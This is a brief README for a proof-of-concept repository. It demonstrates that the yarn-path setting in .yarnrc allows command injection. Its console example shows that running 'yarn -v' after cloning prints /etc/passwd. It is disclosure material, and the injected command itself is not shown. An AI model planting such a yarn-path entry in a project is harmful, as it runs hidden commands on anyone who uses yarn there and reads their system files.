# PoC-yarn-path-command-ijnection

[`yarn-path`](https://classic.yarnpkg.com/en/docs/yarnrc/#toc-yarn-path) in `.yarnrc` can cause command injection.

You can reproduce this problem after cloning this repository, and run `yarn` (>=1.0).

```console
$ git clone https://github.com/yykamei/PoC-yarn-path-command-ijnection
$ yarn -v
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
...
```
